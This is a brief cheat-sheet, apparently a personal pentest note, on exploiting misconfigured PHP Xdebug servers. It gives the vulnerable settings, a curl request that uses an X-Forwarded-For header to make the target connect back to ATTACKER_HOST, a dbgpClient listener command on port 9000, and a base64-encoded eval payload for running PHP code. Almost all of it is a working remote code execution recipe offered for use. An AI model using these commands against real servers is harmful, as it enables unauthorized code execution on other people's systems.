#php

## Resource
https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc

## Vulnerable Server Config

```
# Remote debug.
xdebug.remote_enable= true 
# Connect back to X-Forwarded-For.
xdebug.remote_connect_back= true
# Will be ignored. 
xdebug.remote_host= 127.0.0.1 
```


## Initiate Remote Debug Connection

```bash
curl http://[TARGET_HOST]/?XDEBUG_SESSION_START --header 'X-Forwarded-For: [ATTACKER_HOST]
```


## Command Line Debug Client (Attacker Host)
https://xdebug.org/download#dbgpClient

```bash
./dbgpClient -p 9000
```


## DBGp Commands

Execute php command (in base64). 
```php
eval -i 1 -- JHZhcj1zY2FuZGlyKCcuJyk7
```
- Payload = `$var=scandir('.');`
- Add `$var` before the php command to get the output of the command in CLI debugger.
- `-i 1`: Transaction ID (mandatory but number doesn't import).

![[remote_xdebug-example.png]]